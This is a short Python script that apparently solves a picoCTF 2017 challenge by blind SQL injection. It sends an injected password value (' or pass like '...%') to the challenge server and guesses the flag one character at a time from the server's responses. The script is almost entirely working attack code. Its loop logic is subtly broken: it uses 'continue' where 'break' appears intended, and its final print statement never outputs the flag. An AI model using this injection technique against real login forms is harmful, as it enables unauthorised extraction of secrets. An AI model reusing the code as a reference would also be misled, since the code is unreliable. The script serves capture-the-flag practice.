import requests
import string
import sys

toguess = string.ascii_letters + string.digits + '_{}-+*|[]'

def fill_data(test_string):
    return {'username': 'admin', 'password': '\' or pass like \'{}%'.format(test_string)}

flag = ""
url = "http://shell2017.picoctf.com:35428"

for i in range(0,63):
    for c in toguess:
        resp = requests.post(url, data=fill_data(flag+c))
        sys.stdout.write('\r{}'.format(flag+c))
        if "Flag is 63 characters" in resp.text:
            flag += c
            continue

print("\nFound the flag: ".format(flag))
